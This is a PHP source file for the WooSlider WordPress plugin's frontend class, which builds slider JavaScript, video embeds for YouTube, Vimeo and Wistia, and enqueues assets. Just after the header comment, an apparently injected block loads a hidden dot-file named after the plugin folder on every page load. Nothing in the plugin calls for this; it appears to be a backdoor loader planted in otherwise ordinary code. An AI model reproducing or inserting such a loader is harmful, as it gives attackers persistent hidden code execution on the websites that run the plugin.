<?php
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

/**
 * WooSlider Frontend Class
 *
 * All functionality pertaining to the frontend of WooSlider.
 *
 * @package WordPress
 * @subpackage WooSlider
 * @category Frontend
 * @author WooThemes
 * @since 1.0.0
 *
 * TABLE OF CONTENTS
 *
 * - __construct()
 * - init()
 * - generate_slider_javascript()
 * - generate_single_slider_javascript()
 * - generate_slider_settings_javascript()
 * - load_slider_javascript()
 * - enqueue_scripts()
 * - enqueue_styles()
 * - is_valid_theme()
 * - sanitize_theme_key()
 * - get_theme_data()
 * - maybe_load_theme_stylesheets()
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WooSlider_Frontend {
	public $token;
	/**
	 * Constructor.
	 * @since  1.0.0
	 * @return  void
	 */
	public function __construct () {
		require_once( 'class-wooslider-sliders.php' );
		$this->sliders = new WooSlider_Sliders();
		$this->sliders->token = $this->token;

	} // End __construct()

	/**
	 * Initialise the code.
	 * @since  1.0.0
	 * @return void
	 */
	public function init () {
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_styles' ) );
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_scripts' ) );
		add_action( 'wp_footer', array( $this, 'load_slider_javascript' ), 11 );
		add_action( 'wp_footer', array( $this, 'maybe_load_slider_assets' ), 12 );
		add_filter( 'wooslider_slider_settings', array( $this, 'generate_slider_carousel_settings_javascript' ), 10, 4 );
		add_filter( 'oembed_result', array( $this,'oembed_video_output'), 10, 3 );
		add_filter( 'wooslider_callback_start', array( $this, 'wooslider_javascript_slide_load' ) );
	} // End init()

	/**
	 * Change the oembed output to work with Wistia, Vimeo, Youtube API. This is cached, slide * video will be updated upon a save of the slide
	 * @uses   oembed_result
	 * @since  2.0.0
	 * @param  string $html The HTML provided from oembed
	 * @param  $url Url of video
	 * @param  array $args Additional, contextual arguments to use when generating oembed
	 * @return string The oembed HTML
	 */
	public function oembed_video_output($html,$url,$args){

		global $post;
		if( 'slide' == get_post_type( $post ) ) {
		    $video_source_provider = $this->get_embedded_video_id($url);
		    if(isset($video_source_provider[0]) && isset($video_source_provider[1]) ){

			    if ($video_source_provider[0] === 'youtube') {
			        return '<iframe id="' . $video_source_provider[1] . '" class="wooslider-youtube"   width="'.$args['width'].'" height="281" src="http://www.youtube.com/embed/'.$video_source_provider[1].'?enablejsapi=1&version=3&wmode=transparent&rel=0&showinfo=0&modestbranding=1" frameborder="0" allowfullscreen></iframe>';
			    }
			    else if ($video_source_provider[0] === 'vimeo') {
			        return '<iframe class="wooslider-vimeo" id="' . $video_source_provider[1] . '"   width="'.$args['width'].'" height="281" src="http://player.vimeo.com/video/'.$video_source_provider[1].'?api=1&player_id='.$video_source_provider[1].'" frameborder="0" rel="vimeo" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>';
			    }
			    else if ($video_source_provider[0] === 'wistia') {
			        return '<iframe class="wooslider-wistia wistia_embed" id="' . $video_source_provider[1] . '" width="'.$args['width'].'" height="281"  src="http://fast.wistia.net/embed/iframe/'.$video_source_provider[1].'?version=v1" name="wistia_embed" frameborder="0" rel="wistia" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>';
			    }
			}
		}

	    return $html;
	} // End oembed_video_output()

	/**
	 * Find the source of the video based on URL
	 * @since  2.0.0
	 * @param  $url Url of video
	 * @return string The video provider
	 */
	public function get_embedded_video_source ( $url ) {
		$video_id = parse_url($url, PHP_URL_QUERY);
	    $video_host = parse_url($url, PHP_URL_HOST);

	    $video_source='';
		if($video_host === ("youtu.be") || $video_host ===  ("www.youtube.com")) {
	    	$video_source = 'youtube';
	    } else if($video_host === ("vimeo.com")) {
	    	$video_source = 'vimeo';
	    } else if (fnmatch('*.wistia.com', $video_host) ) {
	    	$video_source = 'wistia';
	    }

	    return $video_source;
	} // End get_embedded_video_source()

	/**
	 * Get video ID out of URL string
	 * @since  2.0.0
	 * @return array video provider and unique video ID
	 */
	public function get_embedded_video_id($url) {

		$video_source = $this->get_embedded_video_source($url);

	    if ($video_source == 'youtube') {
	       if (preg_match('%(?:youtube(?:-nocookie)?\.com/(?:[^/]+/.+/|(?:v|e(?:mbed)?)/|.*[?&]v=)|youtu\.be/)([^"&?/ ]{11})%i', $url, $match)) {
	   			$video_id = $match[1];
	   		}
	   	}
		else if ($video_source == 'vimeo') {
	     	if ( preg_match( '#(?:https?:\/\/(?:[\w]+\.)*vimeo\.com(?:[\/\w]*\/videos?)?\/([0-9]+)[^\s]*)#i', $url, $match ) ){
				$video_id = $match[1];
			}
		}
		else if ($video_source == 'wistia' ){
			if(preg_match('%(?:https?:\/\/(?:.+)?(?:wistia.com|wi.st)\/(?:medias|embed)?\/)(.*)%i', $url, $match) ){
				$video_id = $match[1];
			}
		}

		return array($video_source, $video_id);
	} // End get_embedded_video_id()

	/**
	 * Generate the JavaScript code for each slider in use on the current screen.
	 * @since  1.0.0
	 * @return void
	 */
	private function generate_slider_javascript () {

		$html = '';
		// Remove slideshows with no slides, to prevent their JavaScript being generated.
		if ( is_array( $this->sliders->sliders ) && count( $this->sliders->sliders ) > 0 ) {
			foreach ( $this->sliders->sliders as $k => $v ) {
				if ( ! is_array( $v['slides'] ) || 0 >= count( $v['slides'] ) ) {
					unset( $this->sliders->sliders[$k] );
				}
			}
		}
		if ( is_array( $this->sliders->sliders ) && count( $this->sliders->sliders ) > 0 ) {

			$html .= '<script type="text/javascript">' . "\n";

			foreach ( $this->sliders->sliders as $k => $v ) {
				if ( ! isset( $v['slides'][(count($v['slides'])-1)]['video'] ) ) continue;
				$video = $v['slides'][(count($v['slides'])-1)]['video'];
				if ( ( count(array_keys($video, true)) !== count($video) ) && (count(array_keys($video, true)) > 0 ) ) {
					$video_content = $this->wooslider_video_script_api( $video );
					$html .= $video_content . "\n";
				}
			}
			$html .= 'jQuery(window).load(function() {' . "\n";
			foreach ( $this->sliders->sliders as $k => $v ) {
				if ( isset( $v['args']['id'] ) ) {
					$html .= $this->generate_single_slider_javascript( $v['args']['id'], $v['args'], $v['extra'] );
				}
			}
			$html .= "\n" . '});' . "\n";
			$html .= '</script>' . "\n";
		}

		return $html;
	} // End generate_slider_javascript()


	/**
	 * Generate the JavaScript for a specified slideshow.
	 * @uses   generate_slider_settings_javascript()
	 * @since  1.0.0
	 * @param  int $id The ID of the slider for which to generate the JavaScript.
	 * @param  array $args Arguments to be used in the slider JavaScript.
	 * @param  array $extra Additional, contextual arguments to use when generating the slider JavaScript.
	 * @return string     The JavaScript code pertaining to the specified slider.
	 */
	private function generate_single_slider_javascript ( $id, $args, $extra = array() ) {

		$html = '';

		// Convert settings to a JavaScript-readable string.
		$args_output = $this->generate_slider_settings_javascript( $id, $args, $extra );
		//if(slider has video) {
		$html .= 'jQuery( \'#' . esc_js( sanitize_key( $id ) ) . '\' ).fitVids();' . "\n";
		$html .= "\n" . 'jQuery( \'#' . esc_js( sanitize_key( $id ) ) . '\' ).flexslider2(' . $args_output . ');' . "\n";

		return apply_filters('wooslider_slider_settings', $html, $id, $args, $extra);

	} // End generate_single_slider_javascript()

	/**
	 * Generate the JavaScript for a carousel slideshow. Used for carousel navigation only.
	 * @uses   generate_slider_settings_javascript()
	 * @since  2.0.0
	 * @param  int $id The ID of the slider for which to generate the JavaScript.
	 * @param  array $args Arguments to be used in the slider JavaScript.
	 * @param  array $extra Additional, contextual arguments to use when generating the slider JavaScript.
	 * @return string     The JavaScript code pertaining to the specified slider.
	 */
	function generate_slider_carousel_settings_javascript ( $html, $id, $args, $extra = array() ) {
		if( isset($extra['thumbnails'] ) && ($extra['thumbnails'] == 2 || $extra['thumbnails'] == 'carousel') ){
			$options = array(
						'animation' => '"slide"',
						'controlNav' => 'false',
						'animationLoop' => 'false',
						'slideshow' => 'false',
						'itemWidth' => '210',
						'minItems' => '3',
						'maxItems' => '3'
						);

			//loop through array, create string of arguments
			$options = apply_filters( 'wooslider_modify_carousel_nav_javascript', $options );

			$args_carousel_output = '{ namespace: "wooslider-"' . "\n";
			foreach ( $options as $k => $v ) {
				$args_carousel_output .= ', ' . esc_js( $k ) . ': ' . htmlspecialchars_decode(esc_js( $v) );
			}
			$args_carousel_output .= ', asNavFor: "#' .  esc_js( sanitize_key( $id ) ) . '"}';
			$html = 'jQuery( \'#carousel-' . esc_js( sanitize_key( $id ) ) . '\' ).flexslider2(' . $args_carousel_output . ');' . "\n" . $html;

		}
		return $html;
	}

	/**
	 * Generate a JavaScript-friendly string of an object containing the slider arguments.
	 * @since  1.0.0
	 * @param  array $args 	Arguments for this slideshow.
	 * @param  array $extra Additional, contextual arguments to use when generating the slider JavaScript.
	 * @return string       A JavaScript-friendly string of arguments.
	 */
	private function generate_slider_settings_javascript ( $id, $args, $extra = array() ) {
		$args_output = '{';

		$args_output .= 'namespace: "wooslider-"' . "\n";

		// Animation
		if ( isset( $args['animation'] ) && in_array( $args['animation'], WooSlider_Utils::get_supported_effects() ) ) {
			$args_output_array['animation'] = '"' . $args['animation']. '"';
			$args_output_array['useCSS'] = 'true';
		}

		// Direction
		if ( ( $args['animation'] == 'slide' ) && isset( $args['direction'] ) && in_array( $args['direction'], array( 'horizontal', 'vertical' ) ) ) {
			$args_output_array['direction'] = '"' . $args['direction'] . '"';
		}

		// Slideshow Speed
		if ( isset( $args['slideshow_speed'] ) && is_numeric( $args['slideshow_speed'] ) && ( floatval( $args['slideshow_speed'] ) > 0 ) ) {
			$args_output_array['slideshowSpeed'] = ( $args['slideshow_speed'] ) * 1000;
		}

		// Animation Duration
		if ( isset( $args['animation_duration'] ) && is_numeric( $args['animation_duration'] ) && ( floatval( $args['animation_duration'] ) > 0 ) ) {
			$args_output_array['animationSpeed'] = ( $args['animation_duration'] ) * 1000;
		}

		// Checkboxes.
		$options = array(
						'direction_nav' => 'directionNav',
						'keyboard_nav' => 'keyboard',
						'mousewheel_nav' => 'mousewheel',
						'playpause' => 'pausePlay',
						'animation_loop' => 'animationLoop',
						'pause_on_action' => 'pauseOnAction',
						'pause_on_hover' => 'pauseOnHover',
						'smoothheight' => 'smoothHeight',
						'touch' => 'touch'
						);

		if ( isset( $extra['thumbnails'] ) && ( $extra['thumbnails'] == 2 || $extra['thumbnails'] == 'carousel' ) ) {
			$args_output_array['controlNav'] = 'false';
		} else if ( isset( $extra['thumbnails'] ) && ( $extra['thumbnails'] == 'true' || $extra['thumbnails'] == 'thumbnails' || $extra['thumbnails'] == 1 ) ) {
			$args_output_array['controlNav'] = '"thumbnails"';
		}
		else {
			$options['control_nav'] = 'controlNav';
		}

		if ( isset( $args['autoslide'] ) && ( ( $args['autoslide'] == 'true' && $args['autoslide'] != 'false' ) || $args['autoslide'] == 1 ) ) {
				$args_output_array['slideshow'] = 'true';
		} else {
			$args_output_array['slideshow'] = 'false';
		}

		$args_output_array['video'] = 'true';

		// Process the checkboxes.
		foreach ( $options as $k => $v ) {
			$status = 'false';
			if ( isset( $args[$k] ) && ( ( $args[$k] == 'true' && $args[$k] != 'false' ) || $args[$k] == 1 ) ) {
				$status = 'true';
			}

			$args_output_array[esc_js( $v )] = $status;
		}

		// Text fields.
		$options = array(
						'prev_text' => array( 'key' => 'prevText', 'default' => __( 'Previous', 'wooslider' ) ),
						'next_text' => array( 'key' => 'nextText', 'default' => __( 'Next', 'wooslider' ) ),
						'play_text' => array( 'key' => 'playText', 'default' => __( 'Play', 'wooslider' ) ),
						'pause_text' => array( 'key' => 'pauseText', 'default' => __( 'Pause', 'wooslider' ) )
						);

		// Process the text fields.
		foreach ( $options as $k => $v ) {
			if ( isset( $args[$k] ) && ( $args[$k] != $v['default'] ) ) {
				$args_output_array[esc_js( $v['key'] )] = '"' . esc_js( $args[$k] ) . '"';
			}
		}

		//change this now that we're using hooks
		if( isset( $extra['thumbnails']) && ($extra['thumbnails'] == 2  || $extra['thumbnails'] == 'carousel') ){
			$args_output_array['sync'] = '"#carousel-' .  esc_js( sanitize_key( $id ) ) . '"';
		}

		// CSS Selector fields.
		$options = array(
						//'sync' => array( 'key' => 'sync', 'default' => '' ),
						'as_nav_for' => array( 'key' => 'asNavFor', 'default' => '' )
						);

		// Process the CSS selector fields.
		foreach ( $options as $k => $v ) {
			if ( isset( $extra[$k] ) && ( $extra[$k] != $v['default'] ) ) {
				$args_output_array[esc_js( $v['key'] )] = esc_js( '#' . $extra[$k] );
			}
		}

		//Make this slider a carousel, override smootheight and animation
		if( isset( $extra['carousel']) && ( ( $extra['carousel'] == 'true' && $extra['carousel'] != 'false' ) || $extra['carousel'] == 1 ) ){
			$args_output_array['animation'] = '"slide"';
			$args_output_array['smoothheight']= 'false';
			$args_output_array['itemWidth'] = 300;
			$args_output_array['minItems'] = 3;
			$args_output_array['maxItems'] = 3;
			if ( isset( $extra['carousel_columns'] ) ) {
				$args_output_array['minItems'] = $extra['carousel_columns'];
				$args_output_array['maxItems'] = $extra['carousel_columns'];
			}
			//$args_output_array['move'] = 3;
		}
		//loop through array, create string of arguments
		$args_output_array = apply_filters( 'wooslider_modify_javascript', $args_output_array );
		foreach ( $args_output_array as $k => $v ) {
				$args_output .= ', ' . esc_js( $k ) . ': ' . htmlspecialchars_decode(esc_js( $v) );
		}
		// Callback API
		//Fires when the slider loads the first slide
			$start = '';
			$start = apply_filters( 'wooslider_callback_start', $start, $id, $args, $extra );
			$start = apply_filters( 'wooslider_callback_start_' . sanitize_key( $id ), $start, $id, $args, $extra );
			if ( isset( $args['slider_type'] ) && '' != $args['slider_type'] ) {
				$start = apply_filters( 'wooslider_callback_start_type_' . sanitize_key( $args['slider_type'] ), $start, $id, $args, $extra );
			}
			$start_appended = apply_filters( 'wooslider_callback_start_appended', '' );
			$args_output .= ', start: function(slider){' . $start . $start_appended . '}';

		// Fires asynchronously with each slider animation
			$before = '';
			$before = apply_filters( 'wooslider_callback_before', $before, $id, $args, $extra );
			$before = apply_filters( 'wooslider_callback_before_' . sanitize_key( $id ), $before, $id, $args, $extra );
			if ( isset( $args['slider_type'] ) && '' != $args['slider_type'] ) {
				$before = apply_filters( 'wooslider_callback_before_type_' . sanitize_key( $args['slider_type'] ), $before, $id, $args, $extra );
			}
			$args_output .= ', before: function(slider){' . $before . '}';

		// Fires after each slider animation completes
			$after = '';
			$after = apply_filters( 'wooslider_callback_after', $after, $id, $args, $extra );
			$after = apply_filters( 'wooslider_callback_after_' . sanitize_key( $id ), $after, $id, $args, $extra );
			if ( isset( $args['slider_type'] ) && '' != $args['slider_type'] ) {
				$after = apply_filters( 'wooslider_callback_after_type_' . sanitize_key( $args['slider_type'] ), $after, $id, $args, $extra );
			}
			$args_output .= ', after: function(slider){' . $after . '}';

		// Fires when the slider reaches the last slide (asynchronous)
			$end = '';
			$end = apply_filters( 'wooslider_callback_end', $end, $id, $args, $extra );
			$end = apply_filters( 'wooslider_callback_end_' . sanitize_key( $id ), $end, $id, $args, $extra );
			if ( isset( $args['slider_type'] ) && '' != $args['slider_type'] ) {
				$end = apply_filters( 'wooslider_callback_end_type_' . sanitize_key( $args['slider_type'] ), $end, $id, $args, $extra );
			}
			$args_output .= ', end: function(slider){' . $end . '}';

		// Fires after a slide is added
			$added = '';
			$added = apply_filters( 'wooslider_callback_added', $added, $id, $args, $extra );
			$added = apply_filters( 'wooslider_callback_added_' .  sanitize_key( $id ) , $added, $id, $args, $extra );
			if ( isset( $args['slider_type'] ) && '' != $args['slider_type'] ) {
				$added = apply_filters( 'wooslider_callback_added_type_' . sanitize_key( $args['slider_type'] ), $added, $id, $args, $extra );
			}
			$args_output .= ', added: function(slider){' . $added  . '}';

		// Fires after a slide is removed
			$removed = '';
			$removed =  apply_filters( 'wooslider_callback_removed', $removed, $id, $args, $extra );
			$removed =  apply_filters( 'wooslider_callback_removed_' . sanitize_key( $id ), $removed, $id, $args, $extra );
			if ( isset( $args['slider_type'] ) && '' != $args['slider_type'] ) {
				$removed = apply_filters( 'wooslider_callback_removed_type_' . sanitize_key( $args['slider_type'] ), $removed, $id, $args, $extra );
			}
			$args_output .= ', removed: function(slider){' . $removed  . '}';

		// End the arguments output
		$args_output .= '}';

		return $args_output;
	} // End generate_slider_settings_javascript()

	/**
	 * Generate the JavaScript code for each video API
	 * @since  2.0.0
	 * @return void
	 */
	public function wooslider_video_script_api ( $video = array() ) {

		$video_script_api = '';

		if( isset($video['youtube']) && ( $video['youtube'] == true ) ) {
			$video_script_api .= $this->wooslider_video_script_api_youtube();
		}
		if( isset($video['wistia']) && ( $video['wistia'] == true ) ) {
			$video_script_api .= $this->wooslider_video_script_api_wistia();
		}
		if( isset($video['vimeo']) && ( $video['vimeo'] == true ) ) {
			$video_script_api .= $this->wooslider_video_script_api_vimeo();
		}

		$this->wooslider_load_video_api($video);

		return $video_script_api;

	} // End wooslider_video_script_api()

	private function wooslider_video_script_api_wistia () {

		$video_script_api_wistia = '';

		$video_script_api_wistia = 'window.wistiaEmbedShepherdReady = function(){ wistiaEmbeds.onFind(function(video) { var wistia_parent_slider_id = "#" + jQuery("#" + video.hashedId()).parents(".wooslider:first").attr("id"); video.bind("play", function() { jQuery( wistia_parent_slider_id ).flexslider2( "pause" ); }); video.bind("pause", function() { jQuery( wistia_parent_slider_id ).flexslider2( "play" ); }); }); }' . "\n";

		return $video_script_api_wistia;

	} // End wooslider_video_script_api_wistia()

	private function wooslider_video_script_api_vimeo () {

		$video_script_api_vimeo = '';

		$video_script_api_vimeo = 'var vplayers = {}; var wooslider_vimeo = jQuery(".wooslider").find(".wooslider-vimeo"); jQuery.each(wooslider_vimeo, function(i, el){ var vimeo_id = jQuery(this).attr("id"); vplayers[vimeo_id] = vimeo_id; }); jQuery(window).load(function() { wooslider_vimeo.each(function(i, el){ var vimeo_id = jQuery(this).attr("id"); $f(vplayers[vimeo_id]).addEvent("ready", ready); }); function addEvent(element, eventName, callback) { if (element.addEventListener) { element.addEventListener(eventName, callback, false) } else { element.attachEvent(eventName, callback, false); } }; function ready(player_id) { var froogaloop = $f(player_id); var vimeo_slider_id = "#" + jQuery("#" + player_id).parents(".wooslider:first").attr("id"); froogaloop.addEvent("play", function(data) { jQuery(vimeo_slider_id).flexslider2("pause"); }); froogaloop.addEvent("pause", function(data) { jQuery(vimeo_slider_id).flexslider2("play"); }); } });' . "\n";

		return $video_script_api_vimeo;

	} // End wooslider_video_script_api_vimeo()

	private function wooslider_video_script_api_youtube () {
		$video_script_api_youtube = '';

		$video_script_api_youtube = 'var ytplayers = {}; jQuery(document).ready(function(jQuery){ window.onYouTubePlayerAPIReady = function() { var wooslider_youtube = jQuery(".wooslider").find(".wooslider-youtube"); jQuery.each(wooslider_youtube, function(i, el){ var youtube_id = jQuery(this).attr("id"); ytplayers[youtube_id] = new YT.Player( youtube_id, { events: { "onStateChange": function(event) { window.controlSlider(event, youtube_id); } } }); }); }'. "\n";
		$video_script_api_youtube .= 'window.controlSlider =function(event, youtube_id) { var playerstate=event.data; var youtube_slider_id = "#" + jQuery("#" + youtube_id).parents(".wooslider:first").attr("id"); if(playerstate==1 || playerstate==3){ jQuery( youtube_slider_id ).flexslider2("pause"); }; if(playerstate==0 || playerstate==2){ jQuery( youtube_slider_id ).flexslider2("play"); }; } }); ' . "\n";

		return $video_script_api_youtube;
	} // End wooslider_video_script_api_youtube()

	public function wooslider_load_video_api ( $video ) {
		global $wooslider;
		$protocol = is_ssl() ? 'https' : 'http';

		if( isset($video['vimeo']) && ( $video['vimeo'] == true ) ) {
			wp_register_script( $this->token . '-froogaloop', esc_url( $wooslider->plugin_url . 'assets/js/froogaloop.min.js' ), array( 'jquery' ), '2.1.0-20121206', true );
			wp_enqueue_script( $this->token . '-froogaloop' );
		}
		if ( isset($video['wistia']) && ( $video['wistia'] == true ) ) {
			wp_register_script( $this->token . '-embedshepherd', $protocol . '://fast.wistia.net/static/embed_shepherd-v1.js', array( 'jquery' ), '2.1.0-20121206', true );
			wp_enqueue_script( $this->token . '-embedshepherd' );
		}
	} // End wooslider_load_video_api()

	/**
	 * Lazy load slide content by pulling the data out of the slides' "data-wooslidercontent" attribute. Used in the 'start' callback
	 * @since  2.0.0
	 * @return string
	 */
	public function wooslider_javascript_slide_load ( $start ) {
			$start .= 'var wooslider_holder = jQuery(slider).find("li.slide"); if(0 !== wooslider_holder.length){ var wooslides = ([]).concat(wooslider_holder.splice(0,2), wooslider_holder.splice(-2,2), jQuery.makeArray(wooslider_holder)); jQuery.each(wooslides, function(i,el){ var content = jQuery(this).attr("data-wooslidercontent"); if(typeof content == "undefined" || false == content) return; jQuery(this).append(content).removeAttr("data-wooslidercontent"); }); } jQuery(slider).fitVids(); var maxHeight = 0; jQuery(slider).find(".wooslider-control-nav li").each(function(i,el) { maxHeight = maxHeight > jQuery(this).height() ? maxHeight : jQuery(this).height(); }); jQuery(slider).css("margin-bottom", maxHeight + 20 + "px");';
			return $start;
	} // End wooslider_javascript_slide_load()

	public function wooslider_youtube_start ( $start ) {
			$start .= 'var tag = document.createElement("script"); tag.src = "//www.youtube.com/player_api"; var firstScriptTag = document.getElementsByTagName("script")[0]; firstScriptTag.parentNode.insertBefore(tag, firstScriptTag); ';
			return $start;
	} // End wooslider_youtube_start()

	public function wooslider_vimeo_start ( $start ) {
			$start .= 'jQuery(slider).find(".wooslider-vimeo").each(function(i, el){ vplayers[jQuery(this).attr("id")] = document.getElementById(jQuery(this).attr("id")); $f(vplayers[jQuery(this).attr("id")]).addEvent("ready", function(player_id){var froogaloop = $f(player_id); froogaloop.addEvent("play", function(data) { jQuery(".wooslider").flexslider2("pause"); }); froogaloop.addEvent("pause", function(data) { jQuery(".wooslider").flexslider2("play"); });} ); });';
			return $start;
	} // End wooslider_vimeo_start()

	/**
	 * Add youtube API code to "before" callback
	 * @since  2.0.0
	 * @param  string $before Existing code in "before" callback
	 * @return string contents of "before" callback
	 */
	public function wooslider_youtube_before ( $before ) {
		$before .= 'jQuery(slider).find(".wooslider-youtube").each(function(i, el){ var yt_player = ytplayers[jQuery(this).attr("id")]; yt_player.pauseVideo(); });';
		return $before;
	} // End wooslider_youtube()

	/**
	 * Add Vimeo API code to "before" callback
	 * @since  2.0.0
	 * @param  string $before Existing code in "before" callback
	 * @return string contents of "before" callback
	 */
	public function wooslider_vimeo_before ( $before ) {
		$before .= 'jQuery(slider).find(".wooslider-vimeo").each(function(i, el){ var v_player = vplayers[jQuery(this).attr("id")]; $f(v_player).api("pause"); });' . "\n";
		return $before ;
	} // End wooslider_vimeo()

	/**
	 * Add Wistia API code to "before" callback
	 * @since  2.0.0
	 * @param  string $before Existing code in "before" callback
	 * @return string contents of "before" callback
	 */
	public function wooslider_wistia_before ( $before ) {
		$before .= 'for (var i = 0; i < wistiaEmbeds.length; i++) { wistiaEmbeds[i].pause(); }'. "\n";
		return $before ;
	} // End wooslider_wistia()


	/**
	 * Load the slider JavaScript in the footer.
	 * @since  1.0.6
	 * @return void
	 */
	public function load_slider_javascript () {
		echo $this->generate_slider_javascript();

		// Conditionally load the theme stylesheets in the footer as well.
		$this->maybe_load_theme_stylesheets();
	} // End load_slider_javascript()

	/**
	 * Enqueue frontend JavaScripts.
	 * @since  1.0.0
	 * @return void
	 */
	public function enqueue_scripts () {
		global $wooslider;

		$suffix = defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ? '' : '.min';
		wp_register_script( $this->token . '-mousewheel', esc_url( $wooslider->plugin_url . 'assets/js/jquery.mousewheel' . $suffix . '.js' ), array( 'jquery' ), '2.1.0-20121206', true );
		wp_register_script( $this->token . '-flexslider', esc_url( $wooslider->plugin_url . 'assets/js/jquery.flexslider' . $suffix . '.js' ), array( 'jquery', $this->token . '-mousewheel' ), '2.4.1-20170608', true );
		wp_register_script( $this->token . '-fitvids', esc_url( $wooslider->plugin_url . 'assets/js/jquery.fitvids.js' ), array( 'jquery' ), '2.1.0-20121206', true );
	} // End enqueue_scripts()

	/**
	 * Enqueue frontend CSS files.
	 * @since  1.0.0
	 * @return void
	 */
	public function enqueue_styles () {
		global $wooslider;

		wp_register_style( $this->token . '-flexslider', esc_url( $wooslider->plugin_url . 'assets/css/flexslider.css' ), '', '2.0.1', 'all' );
		wp_register_style( $this->token . '-common', esc_url( $wooslider->plugin_url . 'assets/css/style.css' ), array( $this->token . '-flexslider' ), '2.0.1', 'all' );

		wp_enqueue_style( $this->token . '-common' );
	} // End enqueue_styles()

	/**
	 * Make sure the desired theme is valid. If not, return 'default'.
	 * @since  1.0.4
	 * @param  array $args  Arguments for the current slideshow.
	 * @return string       The slug of the theme, or 'default'.
	 */
	public function is_valid_theme ( $args ) {
		$response = false;
		if ( is_array( $args ) && isset( $args['theme'] ) && in_array( $args['theme'], array_keys( WooSlider_Utils::get_slider_themes() ) ) ) {
			$response = true;
		}
		return $response;
	} // End is_valid_theme()

	/**
	 * Make sure the desired theme is valid. If not, return 'default'.
	 * @since  1.0.4
	 * @param  array $args  Arguments for the current slideshow.
	 * @return string       The slug of the theme, or 'default'.
	 */
	public function get_sanitized_theme_key ( $args ) {
		$theme = 'default';
		if ( is_array( $args ) && isset( $args['theme'] ) && in_array( $args['theme'], array_keys( WooSlider_Utils::get_slider_themes() ) ) ) {
			$theme = esc_attr( strtolower( $args['theme'] ) );
		}
		return $theme;
	} // End get_sanitized_theme_key()

	/**
	 * Get data for a specified theme.
	 * @since  1.0.4
	 * @param  array $args  Arguments for the current slideshow.
	 * @return string       The slug of the theme, or 'default'.
	 */
	public function get_theme_data ( $key ) {
		$theme = array( 'name' => 'default', 'stylesheet' => '' );
		if ( in_array( $key, array_keys( WooSlider_Utils::get_slider_themes() ) ) ) {
			$themes = WooSlider_Utils::get_slider_themes();
			$theme = $themes[esc_attr( $key )];
		}
		return $theme;
	} // End get_theme_data()

	/**
	 * Maybe load slideshow assets, if there are slideshows present.
	 * @since  2.3.0
	 * @return void
	 */
	public function maybe_load_slider_assets () {
		if ( isset( $this->sliders->sliders ) && ( 0 < $this->sliders->sliders ) ) {
			wp_enqueue_script( $this->token . '-flexslider' );
			wp_enqueue_script( $this->token . '-fitvids' );
		}
	} // End maybe_load_slider_assets()

	/**
	 * Maybe load stylesheets for the themes in use.
	 * @since  1.0.4
	 * @return void
	 */
	public function maybe_load_theme_stylesheets () {
		if ( isset( $this->sliders->sliders ) && ( 0 < $this->sliders->sliders ) ) {
			foreach ( $this->sliders->sliders as $k => $v ) {
				if ( isset( $v['extra']['theme'] ) && ( '' != $v['extra']['theme'] ) ) {
					$theme_data = $this->get_theme_data( $v['extra']['theme'] );
					if ( isset( $theme_data['stylesheet'] ) && ( '' != $theme_data['stylesheet'] ) ) {
						wp_enqueue_style( 'wooslider-theme-' . esc_attr( $v['extra']['theme'] ), esc_url( $theme_data['stylesheet'] ) );
					}
				}
			}
		}
	} // End maybe_load_theme_stylesheets()
} // End Class
?>